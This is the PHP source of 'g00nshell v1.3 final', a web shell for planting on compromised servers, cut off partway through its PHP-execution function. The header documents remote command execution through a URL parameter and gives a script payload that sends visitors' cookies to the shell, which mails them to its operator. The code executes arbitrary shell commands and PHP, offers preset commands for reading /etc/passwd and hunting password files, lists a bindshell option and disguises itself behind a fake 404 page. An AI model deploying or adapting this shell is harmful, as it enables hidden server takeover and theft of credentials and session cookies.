<?php
/*
######################################################################
#                       [g00n]FiSh presents:                         #
#                       g00nshell v1.3 final                         #
############################DOCUMENTATION#############################
#To execute commands, simply include ?cmd=___ in the url.            #
#Ex: http://site.com/shl.php?cmd=whoami                              #
#                                                                    #
#To steal cookies, use ?cookie=___ in the url.                       #
#Ex: <script>document.location.href=                                 #
#'http://site.com/shl.php?cookie='+document.cookies</script>         #
##########################VERIFICATION LEVELS#########################
#0: No protection; anyone can access                                 #
#1: User-Agent required                                              #
#2: Require IP                                                       #
#3: Basic Authentication                                             #
##############################KNOWN BUGS##############################
#Windows directory handling                                          #
#                                                                    #
#The SQL tool is NOT complete. There is currently no editing function#
#available. Some time in the future this may be fixed, but for now   #
#don't complain to me about it                                       #
################################SHOUTS################################
#pr0be - Beta testing  & CSS                                         #
#TrinTiTTY - Beta testing                                            #
#clorox - Beta testing                                               #
#Everyone else at g00ns.net                                          #
########################NOTE TO ADMINISTRATORS########################
#If this script has been found on your server without your approval, #
#it would probably be wise to delete it and check your logs.         #
######################################################################
*/

// Configuration
$auth = 0;
$uakey = "b5c3d0b28619de70bf5588505f4061f2"; // MD5 encoded user-agent
$IP = array("127.0.0.2","127.0.0.1"); // IP Addresses allowed to access shell
$email = ""; // E-mail address where cookies will be sent
$user  = "af1035a85447f5aa9d21570d884b723a"; // MD5 encoded User
$pass = "47e331d2b8d07465515c50cb0fad1e5a"; // MD5 encoded Password

// Global Variables
$version = "1.3 final";
$self = $_SERVER['PHP_SELF'];
$soft = $_SERVER["SERVER_SOFTWARE"];
$servinf = split("[:]", getenv('HTTP_HOST'));
$servip = $servinf[0];
$servport = $servinf[1];
$uname = php_uname();
$curuser = @exec('whoami');
$cmd = $_GET['cmd'];
$act = $_GET['act'];
$cmd = $_GET['cmd'];
$cookie = $_GET['cookie'];
$f = $_GET['f'];
$curdir = cleandir(getcwd());
if(!$dir){$dir = $_GET['dir'];}
elseif($dir && $_SESSION['dir']){$dir = $_SESSION['dir'];}
elseif($dir && $_SESSION['dir']){$dir = $curdir;}
if($dir && $dir != "nullz"){$dir = cleandir($dir);}
$contents = $_POST['contents'];
$gf = $_POST['gf'];
$img = $_GET['img'];
session_start();
@set_time_limit(5);
switch($auth){ // Authentication switcher
  case 0: break;
  case 1: if(md5($_SERVER['HTTP_USER_AGENT']) != $uakey){hide();} break;
  case 2: if(!in_array($_SERVER['REMOTE_ADDR'],$IP)){hide();} break;
  case 3: if(!$_SERVER["PHP_AUTH_USER"]){userauth();} break;
}
    
function userauth(){ // Basic authentication function
  global $user, $pass;
  header("WWW-Authenticate: Basic realm='Secure Area'");
  if(md5($_SERVER["PHP_AUTH_USER"]) != $user || md5($_SERVER["PHP_AUTH_PW"] != $pass)){
    hide();
    die();
  }
}

if(!$act && !$cmd && !$cookie && !$f && !$dir && !$gf && !$img){main();}
elseif(!$act && $cmd){
  style();
  echo("<b>Results:</b>\n<br><textarea rows=20 cols=100>");
  $cmd = exec($cmd, $result);
  foreach($result as $line){echo($line . "\n");}
  echo("</textarea>");
}
elseif($cookie){@mail("$email", "Cookie Data", "$cookie", "From: $email"); hide();} // Cookie stealer function
elseif($act == "view" && $f && $dir){view($f, $dir);}
elseif($img){img($img);}
elseif($gf){grab($gf);}
elseif($dir){files($dir);}
else{
  switch($act){
    case "phpinfo": phpinfo();break;
    case "sql": sql();break;
    case "files": files($dir);break;
    case "email": email();break;
    case "cmd": cmd();break;
    case "upload": upload();break;
    case "tools": tools();break;
    case "sqllogin": sqllogin();break;
    case "sql": sql();break;
    case "lookup": lookup();break;
    case "kill": kill();break;
    case "phpexec": execphp();break;
    default: main();break;
  }
}

function cleandir($d){ // Function to clean up the $dir and $curdir variables
  $d = realpath($d);
  $d = str_replace("\\\\", "//", $d);
  $d = str_replace("////", "//", $d);
  $d = str_replace("\\", "/", $d);
  return($d);
}



function hide(){ // Hiding function
  global $self, $soft, $servip, $servport;
die("<!DOCTYPE HTML PUBLIC '-//IETF//DTD HTML 2.0//EN'>
<HTML><HEAD>
<TITLE>404 Not Found</TITLE>
</HEAD><BODY>
<H1>Not Found</H1>
The requested URL $self was not found on this server.<P>
<P>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.
<HR>
<ADDRESS>$soft Server at $servip Port $servport</ADDRESS>
</BODY></HTML>");
}

function style(){ // Style / header function
  global $servip,$version;
  echo("<html>\n
  <head>\n
  <title>g00nshell v" . $version . " - " . $servip . "</title>\n
  <style>\n
  body { background-color:#000000; color:white; font-family:Verdana; font-size:11px; }\n
  h1 { color:white; font-family:Verdana; font-size:11px; }\n
  h3 { color:white; font-family:Verdana; font-size:11px; }\n
  input,textarea,select { color:#FFFFFF; background-color:#2F2F2F; border:1px solid #4F4F4F; font-family:Verdana; font-size:11px; }\n
  textarea { font-family:Courier; font-size:11px; }\n
  a { color:#6F6F6F; text-decoration:none; font-family:Verdana; font-size:11px; }\n
  a:hover { color:#7F7F7F; }\n
  td,th { font-size:12px; vertical-align:middle; }\n
  th { font-size:13px; }\n
  table { empty-cells:show;}\n
  .inf { color:#7F7F7F; }\n
  </style>\n
  </head>\n");
}

function main(){ // Main/menu function
  global $self, $servip, $servport, $uname, $soft, $banner, $curuser, $version;
  style();
  $act = array('cmd'=>'Command Execute','files'=>'File View','phpinfo'=>'PHP info', 'phpexec'=>'PHP Execute',
  'tools'=>'Tools','sqllogin'=>'SQL','email'=>'Email','upload'=>'Get Files','lookup'=>'List Domains','bshell'=>'Bindshell','kill'=>'Kill Shell');
  $capt = array_flip($act);
  echo("<form method='GET' name='shell'>");
  echo("<b>Host:</b> <span class='inf'>" . $servip . "</span><br>");
  echo("<b>Server software:</b> <span class='inf'>" . $soft . "</span><br>");
  echo("<b>Uname:</b> <span class='inf'>" . $uname . "</span><br>");
  echo("<b>Shell Directory:</b> <span class='inf'>" . getcwd() . "</span><br>");
  echo("<div style='display:none' id='info'>");
  echo("<b>Current User:</b> <span class='inf'>" . $curuser . "</span><br>");
  echo("<b>ID:</b> <span class='inf'>" . @exec('id') . "</span><br>");
  if(@ini_get('safe_mode') != ""){echo("<b>Safemode:</b> <font color='red'>ON</font>");}
  else{echo("<b>Safemode:</b> <font color='green'>OFF</font>");}
  echo("\n<br>\n");
  if(@ini_get('open_basedir') != ""){echo("<b>Open Base Dir:</b> <font color='red'>ON</font> [ <span class='inf'>" . ini_get('open_basedir') . "</span> ]");}
  else{echo("<b>Open Base Dir:</b> <font color='green'>OFF</font>");}
  echo("\n<br>\n");
  if(@ini_get('disable_functions') != ""){echo("<b>Disabled functions:</b> " . @ini_get('disable_functions'));}
  else{echo("<b>Disabled functions:</b> None");}
  echo("\n<br>\n");
  if(@function_exists(mysql_connect)){echo("<b>MySQL:</b> <font color='green'>ON</font>");}
  else{echo("<b>MySQL:</b> <font color='red'>OFF</font>");}
  echo("</div>");
  echo("[ <a href='#hax' onClick=\"document.getElementById('info').style.display = 'block';\">More</a> ] ");
  echo("[ <a href='#hax' onClick=\"document.getElementById('info').style.display = 'none';\">Less</a> ]");
  echo("<center>");
  echo("<h3 align='center'>Links</h3>");
  if($_SERVER['QUERY_STRING']){foreach($act as $link){echo("[ <a href='?" . $_SERVER['QUERY_STRING'] . "&act=" . $capt[$link] . "' target='frm'>" . $link . "</a> ] ");}}
  else{foreach($act as $link){echo("[ <a href='?act=" . $capt[$link] . "' target='frm'>" . $link . "</a> ] ");}}
  echo("</center>");
  echo("<hr>");
  echo("<br><iframe name='frm' style='width:100%; height:65%; border:0;' src='?act=files'></iframe>");
  echo("<pre style='text-align:center'>:: g00nshell <font color='red'>v" . $version . "</font> ::</pre>");
  die();
}

function cmd(){ // Command execution function
  style();
  echo("<form name='CMD' method='POST'>");
  echo("<b>Command:</b><br>");
  echo("<input name='cmd' type='text' size='50'>*");
  echo("<select name='precmd'>");
  $precmd = array(''=>'','Read /etc/passwd'=>'cat /etc/passwd','Open ports'=>'netstat -an',
                  'Running Processes'=>'ps -aux', 'Uname'=>'uname -a', 'Get UID'=>'id',
                  'Create Junkfile (/tmp/z)'=>'dd if=/dev/zero of=/tmp/z bs=1M count=1024',
                  'Find passwd files'=>'find / -type f -name passwd');
  $capt = array_flip($precmd);
  foreach($precmd as $c){echo("<option value='" . $c . "'>" . $capt[$c] . "\n");}
  echo("</select><br>\n");
  echo("<input type='submit' value='Execute'>\n");
  echo("</form>\n");
  if($_POST['cmd'] != ""){$x = $_POST['cmd'];}
  elseif($_POST['precmd'] != ""){$x = $_POST['precmd'];}
  else{die();}
  echo("Results: <br><textarea rows=20 cols=100>");
  $cmd = @exec($x, $result);
  foreach($result as $line){echo($line . "\n");}
  echo("</textarea>");
}

function execphp(){ // PHP code execution function
  style();
  echo("<h4>Execute PHP Code</h4>");
  echo("<form method='POST'>");
  echo("<textarea name='phpexec' rows=5 cols=100>");
  if(!$_POST['phpexec']){echo("/*Don't include <? ?>